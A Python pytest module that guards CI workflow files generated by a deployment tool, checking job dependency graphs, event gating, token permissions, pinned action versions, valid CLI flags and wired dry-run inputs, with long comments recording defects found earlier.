# Pinned WITH versions: a name-only pin accepted `actions/checkout@v1`.
# The argocd apply stage deliberately has no checkout (`argocd app sync`
# talks to the server), so the count is deploy-dependent — derived here
# rather than listed per combination.
def _cli_gh_uses(deploy: str) -> list[str]:
    checkouts = 2 if deploy == "argocd" else 3
    return sorted(["actions/checkout@v4"] * checkouts
                  + ["marocchino/sticky-pull-request-comment@v2"])


_PORTAL_GH_USES = ["actions/checkout@v4"] * 3

_PORTAL_GH_TRIGGERS = {
    "pull_request": {"paths": ["conf.d/**"]},
    "push": {"paths": ["conf.d/**"]},
    "workflow_dispatch": None,
}

_GH_JOB_EVENTS = {
    "validate": {"pull_request", "push", "workflow_dispatch"},
    "generate": {"pull_request"},
    "apply": {"workflow_dispatch"},
}

# ⛔ The `needs` EDGES, pinned separately — and that separation is the point.
# The event map above cannot see them: deleting `apply`'s `needs: [validate]`
# altogether leaves every job's reachable-event set unchanged, so the whole
# suite stayed green under it (measured: 58 passed, identical to baseline)
# while `apply` — which carries `environment: production` and runs
# `kubectl apply -f` / `helm upgrade --install` / `argocd app sync --prune` —
# lost its only "the config must pass validate first" gate. Third face of the
# same family: #1356 was a `needs` edge that was too WIDE, the `if:` map above
# covers gates that are too wide, and this covers a `needs` edge that is too
# NARROW. All three let more reach production; none of the others sees this one.
_GH_JOB_NEEDS = {
    "validate": (),
    "generate": ("validate",),
    "apply": ("validate",),
}


def _assert_job_event_reachability(workflow: dict, label: str,
                                   expected: dict[str, set[str]],
                                   expected_needs: dict[str, tuple] | None = None) -> None:
    events = _workflow_events(workflow, label)
    jobs = workflow.get("jobs")
    assert isinstance(jobs, dict) and jobs, f"{label}: no `jobs:` mapping"

    if expected_needs is not None:
        got_needs = {n: _needs_of(j) for n, j in jobs.items()}
        assert got_needs == expected_needs, (
            f"{label}: the `needs:` graph changed.\n"
            f"  got : {got_needs}\n  want: {expected_needs}\n"
            "⛔ This is checked separately from the event map because the event "
            "map cannot see it: dropping an edge leaves every job's reachable "
            "events unchanged. `apply` runs under `environment: production`, so "
            "losing `needs: [validate]` means an unvalidated config deploys. If "
            "the graph change is deliberate, update _GH_JOB_NEEDS in the same "
            "commit so the new shape is reviewable."
        )

    reachability = {
        name: {e for e in events if _runs_under(name, e, jobs, label)}
        for name in jobs
    }
    pretty = {n: sorted(r) for n, r in sorted(reachability.items())}

    # Reported first: it is the more diagnostic failure, and the one #1356 was.
    dead = sorted(n for n, r in reachability.items() if not r)
    assert not dead, (
        f"{label}: {dead} can NEVER run — no event in {sorted(events)} "
        f"satisfies both the job's own `if:` and its transitive `needs` "
        f"closure. GitHub skips every job that needs a SKIPPED job, so a "
        f"`needs:` on an event-gated sibling silently disables the dependant "
        f"(#1356). Full map: {pretty}"
    )
    got = {n: sorted(r) for n, r in reachability.items()}
    want = {n: sorted(r) for n, r in expected.items()}
    assert got == want, (
        f"{label}: the set of events each job runs on changed.\n"
        f"  got : {got}\n  want: {want}\n"
        "⛔ A job that runs on MORE events than intended is not caught by the "
        "dead-job check above — `apply` carries `environment: production` and "
        "writes to the customer's cluster, so widening it to pull_request or "
        "push means every PR deploys. If this change is deliberate, update "
        "_GH_JOB_EVENTS in the same commit so the new contract is reviewable."
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_generated_workflow_job_event_gating(generated, ci, deploy) -> None:
    """⛔ The #1356 detector. Needs no binary — actionlint does not check this.

    actionlint validates that a `needs:` target EXISTS and that no cycle is
    formed; it has no opinion about whether the resulting graph can ever fire.
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    _assert_job_event_reachability(
        yaml.safe_load(path.read_text(encoding="utf-8")),
        f"`da-tools init --ci {ci} --deploy {deploy}` workflow",
        _GH_JOB_EVENTS,
        _GH_JOB_NEEDS,
    )


def _synthetic(if_expr, needs=None, events=("pull_request", "workflow_dispatch")):
    """A two-job workflow: `gate` is pull_request-only, `subject` is under test."""
    subject: dict = {"runs-on": "ubuntu-latest", "steps": []}
    if if_expr is not None:
        subject["if"] = if_expr
    if needs is not None:
        subject["needs"] = needs
    return {
        True: {e: None for e in events},
        "jobs": {
            "gate": {"if": "github.event_name == 'pull_request'",
                     "runs-on": "ubuntu-latest", "steps": []},
            "subject": subject,
        },
    }


# ⛔ The evaluator's ONLY safety property is that it refuses to score an `if:`
# it does not understand. Nothing pinned that: adversarial review replaced both
# `raise _UnsupportedIf` with `return True` — the exact relaxation the code
# comment forbids in prose — and the suite stayed green at 52 passed, because
# the two shipped generators happen to emit only the one supported shape. A
# prose ⛔ stops no machine, so the property gets a counter-example test.
_UNSUPPORTED_IFS = [
    "always()",
    "!cancelled()",
    "success() && github.event_name == 'workflow_dispatch'",
    "github.event_name == 'push' || github.event_name == 'pull_request'",
    "github.event_name != 'push'",
    "${{ github.actor != 'nobody' }}",
    "github.ref == 'refs/heads/main'",
    "true",
]


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generated_commands_pass_only_flags_the_cli_declares(
    generated, ci, deploy
) -> None:
    """⛔ Every `da-tools <sub> --flag` in a shipped artifact must be a real flag.

    The two validators grade YAML; an unrecognised flag is a runtime error, so
    nothing in this file could see it — and the shipped `validate-config
    --config-dir … --ci` was exactly that: `--ci` belongs to
    `lint_custom_rules.py`, not to `validate_config.py`, so Stage 1 exited 2 on
    every run and `needs: [validate]` propagated the skip to `generate` and
    `apply`. The customer's first PR after `da-tools init` could never go green.

    Both the subcommand set and each one's flags are read from source, so a new
    subcommand or a renamed flag is covered the day it lands.
    """
    declared = _da_tools_subcommands()
    checked = 0
    for path in sorted((generated[(ci, deploy)]).rglob("*")):
        if path.is_dir() or path.suffix not in {".yaml", ".yml"}:
            continue
        doc = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        blocks: list[str] = []
        for value in _walk_scalars(doc):
            blocks.append(_strip_shell_comments(value))
        for argv in [a for b in blocks for a in _command_argvs(b)]:
            for i, tok in enumerate(argv):
                if tok not in declared:
                    continue
                used = {
                    t.split("=")[0] for t in argv[i + 1:]
                    if t.startswith("--")
                }
                unknown = sorted(used - declared[tok] - _CLI_GLOBAL_FLAGS)
                assert not unknown, (
                    f"{path.name} runs `da-tools {tok}` with flag(s) {unknown}, "
                    f"which that subcommand does not declare "
                    f"(it has {sorted(declared[tok]) or 'none'}).\n"
                    "argparse exits 2 on an unrecognised flag, so the step fails "
                    "on every run and every job that `needs:` it is skipped — a "
                    "pipeline that can never go green. Neither actionlint nor "
                    "the GitLab schema can see this; only this assertion can."
                )
                if len(argv) > 1:
                    checked += 1
    # ⛔ Counts only MULTI-TOKEN argv. `validate` is itself a subcommand name,
    # so `stage: validate`, `needs: validate` and `stages: [validate, …]` each
    # incremented this floor — measured: with real-command extraction disabled,
    # the three `--ci github` combinations stayed green on bare names alone.
    assert checked, (
        f"no multi-token `da-tools <subcommand> …` invocation found in the "
        f"--ci {ci} --deploy "
        f"{deploy} artifacts — the extractor stopped matching, so this test "
        "would pass vacuously."
    )


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> None:
    """⛔ The pre-commit artifact's `entry:` must be executable, not just valid YAML.

    pre-commit splits `entry` with shlex and execs it WITHOUT a shell
    (`pre_commit/lang_base.py`), so any `$VAR` / `${VAR}` / `$(cmd)` in there is
    passed through literally. The shipped hooks used
    `docker run -v ${PWD}/conf.d:...` under `language: system`, which handed
    docker the literal string `${PWD}/conf.d` and failed on EVERY commit that
    touched conf.d — the "shift-left" artifact protected nothing, with a cryptic
    invalid-volume error as its only symptom.

    The pre-existing tests asserted the snippet parses, declares a local repo,
    names both hook ids, filters on conf.d and sets a language. Every one of
    those passed on a hook that could not run: "is it well-formed" and "does it
    work" are different questions, and only the first was being asked.
    """
    path = generated[(ci, deploy)] / ".pre-commit-config.da.yaml"
    cfg = yaml.safe_load(path.read_text(encoding="utf-8"))
    hooks = [h for r in cfg["repos"] for h in r["hooks"]]
    assert hooks, "no hooks in the generated pre-commit config"
    for hook in hooks:
        entry = str(hook.get("entry", ""))
        assert not re.search(r"\$\{?\w+|\$\(", entry), (
            f"hook {hook.get('id')!r} entry contains a shell expansion: "
            f"{entry!r}. pre-commit execs `entry` without a shell, so this "
            "reaches the process as a literal and the hook fails on every run."
        )
        # `language: system` means "run this argv as-is"; a `docker run` there
        # needs an absolute mount source, which cannot be produced without a
        # shell. docker_image is the language that supplies the mount itself.
        if entry.split()[:2] == ["docker", "run"]:
            assert hook.get("language") == "docker_image", (
                f"hook {hook.get('id')!r} hand-rolls `docker run` under "
                f"`language: {hook.get('language')!r}`. Use docker_image and let "
                "pre-commit build the command and the /src mount."
            )


def test_the_unsupported_if_corpus_is_not_empty() -> None:
    """⛔ Anti-vacuity floor for the corpus that guards the guard.

    An empty `parametrize` is a SKIP and exits 0. This corpus protects the
    evaluator's ONLY safety property — its refusal to grade an `if:` it cannot
    read — so a silent emptying removes the protection without a red run.
    Measured: emptying this list and the parity file's `_BYPASSES` gave
    81 passed / 2 skipped / exit 0. The file already argues this hazard for the
    CLI matrix; the axes guarding the guards needed the same floor.
    """
    assert len(_UNSUPPORTED_IFS) >= 6, (
        f"only {len(_UNSUPPORTED_IFS)} unsupported-`if:` shapes remain — this "
        "corpus is what proves the evaluator fails closed. Do not shrink it to "
        "make a change pass."
    )


@pytest.mark.parametrize("if_expr", _UNSUPPORTED_IFS)
def test_reachability_evaluator_refuses_shapes_it_cannot_read(if_expr) -> None:
    """Fail-CLOSED: an unreadable `if:` raises instead of assuming reachable.

    Assuming reachable is how #1356 hides — the job looks fine and never runs.
    Extending the evaluator is the correct response to a new shape; relaxing it
    is not, and this test is what makes that a decision rather than an edit.
    """
    with pytest.raises(_UnsupportedIf):
        _assert_job_event_reachability(
            _synthetic(if_expr), "synthetic", {"gate": set(), "subject": set()})


def test_reachability_evaluator_reads_the_shapes_it_claims_to() -> None:
    """The paired positive: supported shapes must NOT be refused or misread.

    Without this the previous test is satisfiable by refusing everything, which
    would make the guard bite every workflow and stop being read.
    """
    _assert_job_event_reachability(
        _synthetic("github.event_name == 'workflow_dispatch'"), "synthetic-ok",
        {"gate": {"pull_request"}, "subject": {"workflow_dispatch"}})
    # No `if:` at all == runs on every event.
    _assert_job_event_reachability(
        _synthetic(None), "synthetic-nogate",
        {"gate": {"pull_request"}, "subject": {"pull_request", "workflow_dispatch"}})


def test_reachability_evaluator_propagates_skips_through_needs() -> None:
    """#1356 in miniature, on synthetic input: a skipped dep skips its dependant."""
    dead = _synthetic("github.event_name == 'workflow_dispatch'", needs=["gate"])
    with pytest.raises(AssertionError, match="can NEVER run"):
        _assert_job_event_reachability(
            dead, "synthetic-dead", {"gate": {"pull_request"}, "subject": set()})


def test_reachability_evaluator_flags_a_widened_gate() -> None:
    """The other direction: MORE events than the contract is also a failure."""
    with pytest.raises(AssertionError, match="runs on changed"):
        _assert_job_event_reachability(
            _synthetic(None), "synthetic-wide",
            {"gate": {"pull_request"}, "subject": {"workflow_dispatch"}})


@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
def test_gitlab_jobs_reference_declared_stages(generated, ci, deploy) -> None:
    """Every job's ``stage:`` must be declared in the top-level ``stages:``.

    This is the thin-wrapper part: the vendored GitLab schema validates the
    SHAPE of a job, so it accepts ``stage: typo`` happily — GitLab itself only
    rejects it at pipeline-creation time. Verified empirically: the schema does
    catch an illegal ``when`` enum and a wrong-typed ``variables``, but not an
    undeclared stage reference.
    """
    path = generated[(ci, deploy)] / _GL_PIPELINE
    pipeline = yaml.safe_load(path.read_text(encoding="utf-8"))

    stages = pipeline.get("stages")
    assert stages, f"no top-level `stages:` in the `--deploy {deploy}` pipeline"

    jobs = _gitlab_jobs(pipeline)
    # ⛔ EXACT, like `_EXPECTED_GH_JOBS`. A `>= 4` floor only catches jobs going
    # missing; it says nothing about jobs APPEARING, and the appearing direction
    # is the dangerous one here. Measured: adding an `apply-hotfix` job that
    # runs `kubectl apply` under a bare `rules: - when: manual` and declares no
    # `environment:` left the suite at 83 passed — invisible to the stage check
    # (it has a valid stage) and invisible to the deploy-trigger check below
    # (which selects on `environment:`, a key the new job simply omits).
    # Selecting on a marker the subject chooses for itself is the same failure
    # the actionlint classifier had; pinning the set removes the choice.
    assert set(jobs) == _EXPECTED_GL_JOBS, (
        f"GitLab job set is {sorted(jobs)}, expected {sorted(_EXPECTED_GL_JOBS)}.\n"
        "A NEW job is not automatically covered by the checks in this file — in "
        "particular a cluster-writing job that omits `environment:` is skipped "
        "by the deploy-trigger guard entirely. Add it here AND make sure the "
        "trigger guard actually grades it before you widen this set."
    )
    for name, body in jobs.items():
        assert "stage" in body, f"job {name!r} declares no stage"
        assert body["stage"] in stages, (
            f"job {name!r} runs in stage {body['stage']!r}, which is not in "
            f"{stages} — GitLab refuses to create the pipeline"
        )


_ENTRYPOINT = _REPO_ROOT / "components" / "da-tools" / "app" / "entrypoint.py"

# ⛔ Only what argparse itself provides to every parser. This set was previously
# `{--help, --version, --prometheus, --config-dir}`, sourced from
# docs/cli-reference.md:83 ("所有命令都支援以下全局選項") and citing that line as
# its authority. That sentence is FALSE, measured:
#   validate-config --config-dir <d> --prometheus http://x  -> rc=2
#   config-diff --old-dir <d> --new-dir <d> --config-dir <d> -> rc=2
# `--prometheus` is injected by entrypoint.py only for the PROMETHEUS_COMMANDS
# set, and `--config-dir` is an ordinary per-subcommand argument. Exempting them
# re-opened the exact class this guard closes: adding `--prometheus` to the
# shipped Stage 1 left 93 passed while the step exited 2 on every run.
#
# ⛔⛔ The lesson is narrower than "verify docs": this constant was written one
# round AFTER a finding whose stated conclusion was "when a chain of reasoning
# rests on a document, verify the document" — and it was written by copying a
# document. The trigger has to fire at the moment a sentence is about to become
# a constant or an exemption list, not only while chasing a bug. Exemptions are
# derived from code below; nothing here is transcribed from prose.
_CLI_GLOBAL_FLAGS = {"--help"}


def _prometheus_commands() -> set[str]:
    """Subcommands entrypoint.py injects `--prometheus` into, read from source."""
    tree = ast.parse(_ENTRYPOINT.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        names = {t.id for t in node.targets if isinstance(t, ast.Name)}
        if "PROMETHEUS_COMMANDS" not in names:
            continue
        if isinstance(node.value, (ast.Set, ast.List, ast.Tuple)):
            return {
                e.value for e in node.value.elts
                if isinstance(e, ast.Constant) and isinstance(e.value, str)
            }
    return set()


_SHELL_SEPARATORS = frozenset({"&&", "||", ";", ";;", "|", "&", "(", ")"})


def _command_argvs(text: str) -> list[list[str]]:
    """Each shell command in a scalar, as argv. Comments already stripped.

    Deliberately a local helper rather than an import from the sibling guard:
    that file is a different test module, and a cross-module import would make
    one suite's collection depend on the other's. The derivation is the same —
    tokenise with shlex, split on the operators that end a command — so a flag
    belonging to a LATER command in a `&&` chain is not attributed to an
    earlier subcommand.
    """
    argvs: list[list[str]] = []
    for raw in re.sub(r"\\\n\s*", " ", text).split("\n"):
        line = raw.strip()
        if not line:
            continue
        lex = shlex.shlex(line, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        try:
            tokens = list(lex)
        except ValueError:
            continue  # unbalanced quote: not a command this guard can read
        current: list[str] = []
        for tok in tokens:
            if tok in _SHELL_SEPARATORS:
                if current:
                    argvs.append(current)
                current = []
            else:
                current.append(tok)
        if current:
            argvs.append(current)
    return argvs


def _walk_scalars(node):
    """Every string scalar in a parsed YAML document."""
    if isinstance(node, str):
        yield node
    elif isinstance(node, list):
        for v in node:
            yield from _walk_scalars(v)
    elif isinstance(node, dict):
        for v in node.values():
            yield from _walk_scalars(v)


def _da_tools_subcommands() -> dict[str, set[str]]:
    """subcommand -> the long flags its script actually declares.

    ⛔ DERIVED end to end: the subcommand list comes from the image entrypoint's
    own dispatch table, and each flag set from that script's `add_argument`
    calls. Nothing here is transcribed, because a transcription would go stale
    exactly when it matters.

    This exists because the generated artifacts invoke OUR OWN CLI and nothing
    checked that the flags are real. Both validators are blind to it — actionlint
    and the GitLab schema grade YAML, and a wrong flag is a runtime error — so
    the shipped Stage 1 ran `validate-config … --ci` against a script that
    declares no `--ci`, exited 2 on every run for every customer, and took
    `generate` and `apply` down with it via `needs:`. Measured through the real
    dispatcher: `unrecognized arguments: --ci`, exit 2.
    """
    tree = ast.parse(_ENTRYPOINT.read_text(encoding="utf-8"))
    dispatch: dict[str, str] = {}
    for node in ast.walk(tree):
        if not isinstance(node, ast.Dict):
            continue
        pairs = {
            k.value: v.value
            for k, v in zip(node.keys, node.values)
            if isinstance(k, ast.Constant) and isinstance(v, ast.Constant)
            and isinstance(k.value, str) and isinstance(v.value, str)
        }
        if pairs and all(str(v).endswith(".py") for v in pairs.values()):
            dispatch.update(pairs)
    assert len(dispatch) >= 5, (
        f"only {len(dispatch)} subcommand→script entries found in "
        f"{_ENTRYPOINT} — the dispatch-table reader stopped matching, so the "
        "flag check below would grade almost nothing."
    )

    promq = _prometheus_commands()
    out: dict[str, set[str]] = {}
    for sub, script in dispatch.items():
        hits = list(_REPO_ROOT.glob(f"scripts/tools/**/{script}"))
        if not hits:
            continue
        flags: set[str] = set()
        for n in ast.walk(ast.parse(hits[0].read_text(encoding="utf-8"))):
            if (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                    and n.func.attr == "add_argument"):
                flags.update(
                    a.value for a in n.args
                    if isinstance(a, ast.Constant) and isinstance(a.value, str)
                    and a.value.startswith("--")
                )
        # `--prometheus` is injected by the entrypoint, not declared by the
        # script — so it is legal for exactly the commands that list names.
        if sub in promq:
            flags.add("--prometheus")
        out[sub] = flags
    assert out, "no da-tools scripts resolved — the glob stopped matching"
    return out


def _strip_shell_comments(text: str) -> str:
    """`run:`/`script:` text with shell comments removed, line by line.

    ⛔ YAML parsing removes YAML comments; it does NOT touch a `#` inside a
    `run:` block, because there the `#` is part of the scalar. So moving an
    "is this knob read?" search from the raw file into the parsed steps closes
    only half the class — the prose just moved inside the string. Measured: with
    the dead #1361 input restored (12 failed), adding one line
    `# TODO: honour ${{ inputs.dry_run }}` to an existing `run:` block dropped it
    to 8 failed, with both kustomize combinations fully green and the dead knob
    still shipping.

    ⛔ Derived from the shell rule, and STRICTLY STRONGER than the nearest
    existing helpers — an earlier version of this docstring cited a
    `_strip_bash_comment` in the nightly-scan guard as the shared source. No
    such symbol exists anywhere in the repo; that citation was fabricated. What
    does exist is whole-LINE stripping (`test_nightly_scan_matrix_drift.py`'s
    `startswith("#")`) and `check_workflow_git_push_permissions.py`'s
    `_strip_shell_comment_lines`, whose own docstring says a trailing `# …`
    after real code is out of scope. Both would miss the trailing-comment case
    this function exists for, so the rule here is stated from first principles:
    a `#` begins a comment when it starts a word — line start or after unquoted
    whitespace — and never inside `'`/`"`. Stripping too much only makes a "was
    it read" test harder to satisfy, i.e. a false RED.
    """
    out = []
    for line in text.split("\n"):
        quote = ""
        cut = len(line)
        for i, ch in enumerate(line):
            if quote:
                if ch == quote:
                    quote = ""
            elif ch in "'\"":
                quote = ch
            elif ch == "#" and (i == 0 or line[i - 1].isspace()):
                cut = i
                break
        out.append(line[:cut])
    return "\n".join(out)


def _unwired_knobs(workflow: dict) -> list[str]:
    """Declared knobs that never reach anything that executes.

    ⛔ TWO HOPS, because one hop is defeated by a single line. The knobs are
    `workflow_dispatch.inputs.*` AND the `env:` names the workflow declares —
    both are things a customer can edit expecting an effect.

    The first version of this check searched a surface that INCLUDED the
    workflow-level `env:` block, so that an input bound to an env var counted as
    wired. That kills a real false positive and creates a worse false negative:
    `env: {DRY_RUN: ${{ inputs.dry_run }}}` with nothing reading `$DRY_RUN`
    scored as wiring. Measured: the dead #1361 input alone → 12 failed; the same
    input plus that one `env:` line → 93 passed, with the operator ticking
    "Dry-run mode (no actual apply)" and getting a real production apply. The
    binding is not the wiring — it is the first half of it.

    So: an env binding is followed to its VARIABLE NAME, and that name must
    itself appear in an executable position. Direct `inputs.<name>` references
    in a `run:`/`if:`/`with:` still count, which is the other legal shape.
    """
    # ⛔ SCOPED, because GitHub's `env:` is. The first two-hop version pooled
    # every job's steps into one `executable` string while collecting bindings
    # from workflow AND job level — so a binding in job A satisfied a read in
    # job B, where that variable does not exist. That is the aggregation bug
    # (for-all quietly becoming exists) one level below the one this file had
    # already fixed in the GitLab rules loop. Measured: job A binding
    # `NS: ${{ inputs.target_ns }}` and never reading it, job B doing
    # `kubectl -n ${{ env.NS }}`, scored as wired — while B's `env.NS` is
    # undefined at runtime.
    #
    # Visibility, precisely: workflow `env:` is visible everywhere; a job's
    # `env:` only inside that job; a step's `env:` only inside that step. Step
    # level is included because it is the MOST idiomatic wiring point and its
    # absence made the correct artifact fail (the docstring used to claim it was
    # searched; it was not).
    def _reads(text: str, name: str) -> bool:
        return bool(
            re.search(rf"\$\{{?{re.escape(name)}(?![\w-])", text)
            or re.search(rf"env\.{re.escape(name)}(?![\w-])", text)
        )

    def _binds(mapping, token: str) -> list[str]:
        return [
            str(k) for k, v in (mapping or {}).items()
            if re.search(rf"{re.escape(token)}(?![\w-])", str(v))
        ]

    wf_env = workflow.get("env") or {}

    def _wired(token: str) -> bool:
        for job in workflow["jobs"].values():
            job_env = job.get("env") or {}
            # A job-level `if:` is an executable position for the token itself,
            # not only for env-name reads. `if: ${{ inputs.dry_run == 'false' }}`
            # on the apply job is one of the most natural ways to honour a
            # dry-run knob, and it was reported as unwired while the docstring
            # claimed job `if:` was searched — true for the env half, false here.
            if re.search(rf"{re.escape(token)}(?![\w-])", str(job.get("if", ""))):
                return True
            job_text_parts = [str(job.get("if", ""))]
            for step in (job.get("steps") or []):
                step_env = step.get("env") or {}
                step_text = (
                    f"{step.get('if', '')}\n"
                    f"{_strip_shell_comments(str(step.get('run', '')))}\n"
                    f"{step.get('with', '')}"
                )
                job_text_parts.append(step_text)
                if re.search(rf"{re.escape(token)}(?![\w-])", step_text):
                    return True
                # a step-level binding is only readable by that same step
                if any(_reads(step_text, n) for n in _binds(step_env, token)):
                    return True
            job_text = "\n".join(job_text_parts)
            # job- and workflow-level bindings are readable anywhere in this job
            for scope_env in (job_env, wf_env):
                if any(_reads(job_text, n) for n in _binds(scope_env, token)):
                    return True
        return False

    triggers = workflow.get(True) or workflow.get("on") or {}
    inputs = ((triggers.get("workflow_dispatch") or {}).get("inputs") or {})
    dead = [f"inputs.{n}" for n in inputs if not _wired(f"inputs.{n}")]
    # Workflow-level `env:` knobs are the same class: a customer edits the one
    # namespace-looking name in the file and nothing changes. Visible in every
    # job, so a single pooled read is the right test for these.
    all_text = "\n".join(
        f"{s.get('if', '')}\n{_strip_shell_comments(str(s.get('run', '')))}\n"
        f"{s.get('with', '')}"
        for job in workflow["jobs"].values()
        for s in ([{"if": job.get("if", "")}] + list(job.get("steps") or []))
    )
    dead += [f"env.{n}" for n in wf_env if not _reads(all_text, str(n))]
    return sorted(dead)


def _assert_github_deploy_contract(
    workflow: dict, label: str, expected_perms: dict, expected_triggers: dict,
    expected_uses: list[str], expects_lint: bool,
) -> None:
    """Properties that must hold for EVERY generated GitHub workflow.

    ⛔ Shared on purpose. Three separate checks were written against the CLI
    artifact only, and the portal preview — a second, hand-written copy of the
    same workflow that the wizard shows customers as a "copy me" sample — was
    left ungraded by all three. Measured, each against a 93-passed baseline:
    adding `permissions: {contents: write, id-token: write}` to the preview's
    `apply` job → 93 passed; restoring the dead #1361 `dry_run` input to the
    preview → 93 passed. Both defects this PR removed from the CLI could be
    re-shipped from the other generator without a single test going red.

    Putting the properties in one function called from both call sites is the
    structural version of "fix the class, not the cited instance": a future
    property added here cannot be added to one leg only.
    """
    # (1) Job-level `permissions:` overrides the workflow-level grant entirely,
    # so pinning only the top block measures the half that loses.
    # ⛔ EFFECTIVE permissions per job, both directions. GitHub's job block
    # REPLACES the workflow block wholesale — it does not merge — so a job that
    # lists fewer scopes has silently DROPPED the rest.
    #
    # The first form of this rule only compared the scopes a job listed against
    # the workflow grant, i.e. it watched widening alone. Measured: adding
    # `permissions: {contents: read}` to the `generate` job left 95 passed and
    # zero red — while that job's only output, the sticky PR comment, goes back
    # to 403ing. That is exactly the defect this PR added the block to fix, put
    # back by a plausible "tighten this job" edit.
    #
    # (The old comment also justified the relaxation with an artifact the rule
    # actually rejected — top-level `contents: read` plus `pull-requests: write`
    # on `generate` alone. Under effective-permissions that shape is legal and
    # strictly better, so the justification is now true as well as stated.)
    _RANK = {"none": 0, "read": 1, "write": 2}

    def _rank(v) -> int:
        return _RANK.get(str(v), 99)

    # Scopes a step demands, keyed by what the step uses. Derived from the
    # action's API surface, not from the job it happens to sit in.
    # ⛔ `actions/checkout` is in here because it is the step EVERY job runs and
    # it needs `contents: read` on a private repository — the customer's normal
    # case. Measured: `permissions: {}` on the `validate` job left 95 passed
    # while checkout 403s and the whole validate stage dies before it starts.
    # The rule claimed to be bidirectional and was not: the widening half was
    # live (a job granting `contents: write` reds 6), the demand half knew one
    # action.
    #
    # ⚠️ STATED LIMIT, because this derivation cannot be complete: it reads
    # `uses:`, so a step doing `run: gh api --method POST .../comments` demands
    # nothing as far as this rule can tell.
    #
    # ⛔ The compensating control is the `uses:` SET pinned below — and the
    # earlier version of this comment named `_EXPECTED_GH_JOBS` and the portal's
    # pin instead, which was false twice over: the former pins job NAMES, and the
    # latter only covers the portal leg. Measured against that claim: adding a
    # fifth step `uses: peter-evans/create-or-update-comment@v4` to the CLI
    # `generate` job left 95 passed, and renaming all four `actions/checkout@v4`
    # to `evil-fork/checkout@v1` also left 95 passed — the second is worse,
    # because `_demands` matches on the action name, so RENAMING an action
    # exempts it from its own scope requirement. That is selection on a marker
    # the subject chooses for itself, the exact shape this file criticises
    # elsewhere. The set pin removes the choice.
    _NEEDS: dict[str, tuple[str, str]] = {
        "actions/checkout": ("contents", "read"),
        "marocchino/sticky-pull-request-comment": ("pull-requests", "write"),
    }

    # ⛔ Floor. `_NEEDS` is consumed by a loop, which is the shape in this file
    # that retires SILENTLY — the same one `_EXPECTED_GL_JOB_RULES` got a floor
    # for, in this same file, and this dict was missed. Measured: `_NEEDS = {}`
    # left 84 passed even with `permissions: {}` on `validate`, i.e. the entire
    # demand half of the rule disappears without a red run.
    assert len(_NEEDS) >= 2, (
        f"_NEEDS has {len(_NEEDS)} entries — emptying it makes the demand half "
        "of the permissions rule a no-op that still reports green."
    )
    # ⛔ BIND the two lists. The comment above calls the `uses:` set pin the
    # compensating control for this table — prose only, until now: they were two
    # independent hand-written lists, and the floor above proves the dict is
    # non-empty, not that it covers the pinned actions. So adding an action reds
    # the `uses:` pin, whose message says "add it to `_NEEDS` too" — and the
    # edit that clears the red is `expected_uses` alone, leaving the new
    # action's scope requirement unenforced forever. Naming the
    # demands-nothing actions explicitly is what makes the omission deliberate.
    _NEEDS_NOTHING = {"actions/upload-artifact", "actions/download-artifact"}
    unclassified = sorted(
        {u.split("@")[0] for u in expected_uses} - set(_NEEDS) - _NEEDS_NOTHING
    )
    assert not unclassified, (
        f"{label}: action(s) {unclassified} are pinned in the `uses:` set but "
        "appear in neither `_NEEDS` nor `_NEEDS_NOTHING`. Decide which: give it "
        "the scope it needs, or record that it needs none. An action in neither "
        "list is one whose token requirements nothing checks."
    )

    def _demands(step: dict) -> list[tuple[str, str]]:
        uses = str(step.get("uses", "")).split("@")[0]
        return [need for action, need in _NEEDS.items() if uses == action]

    for jname, job in workflow["jobs"].items():
        effective = job["permissions"] if "permissions" in job else expected_perms
        for scope, value in effective.items():
            assert _rank(value) <= _rank(expected_perms.get(scope, "none")), (
                f"{label}: job {jname!r} has effective `{scope}: {value}` while "
                f"the workflow grant is `{scope}: "
                f"{expected_perms.get(scope, 'none')}`. A job block WIDENS that "
                "job's token — and `apply` is the `environment: production` "
                "job, the worst place for it."
            )
        for step in (job.get("steps") or []):
            for scope, needed in _demands(step):
                assert _rank(effective.get(scope, "none")) >= _rank(needed), (
                    f"{label}: job {jname!r} runs {step.get('uses')!r}, which "
                    f"needs `{scope}: {needed}`, but its EFFECTIVE grant is "
                    f"`{scope}: {effective.get(scope, 'none')}`.\n"
                    "A job-level `permissions:` block REPLACES the workflow-level "
                    "one rather than merging, so listing fewer scopes drops the "
                    "rest — the step 403s and the customer silently loses its "
                    "output. Grant the scope on the job, or remove the block."
                )
    assert workflow.get("permissions") == expected_perms, (
        f"{label}: permissions are {workflow.get('permissions')!r}, expected "
        f"{expected_perms!r}."
    )

    # (2) Every declared knob must reach an EXECUTABLE position.
    unread = _unwired_knobs(workflow)
    assert not unread, (
        f"{label}: declared knob(s) {unread} never reach anything that runs. A "
        "knob wired to nothing is worse than no knob — the operator believes "
        "they changed the run's behaviour and they did not (#1361). Wire it to "
        "a `run:`/`if:`/`with:` (directly, or through an `env:` binding that "
        "some step actually reads), or delete it."
    )

    # (1b) The action set, pinned WITH its versions. Renaming an action exempted
    # it from `_NEEDS`; adding one brought a new API surface with no scope
    # review. Versions are pinned too because `actions/checkout@v1` satisfied a
    # name-only pin on both legs while behaving differently.
    used = sorted(
        str(s["uses"])
        for job in workflow["jobs"].values()
        for s in (job.get("steps") or [])
        if s.get("uses")
    )
    assert used == expected_uses, (
        f"{label}: `uses:` set is {used}, expected {expected_uses}.\n"
        "A new action arrives with an API surface nobody scoped, and a RENAMED "
        "one silently exempts itself from the permissions demand table. Add it "
        "here and to `_NEEDS` together, with the scope it needs."
    )

    # (2b) The trigger's FILTERS, not just its event names.
    triggers_decl = workflow.get(True) or workflow.get("on") or {}
    assert triggers_decl == expected_triggers, (
        f"{label}: `on:` is {triggers_decl!r}, expected "
        f"{expected_triggers!r}.\nEvent names alone do not say whether the "
        "workflow ever fires: a `paths:` that matches nothing, or a `branches:` "
        "naming a branch that does not exist, leaves validate and generate dead "
        "on every PR while `apply` stays a live production deploy."
    )

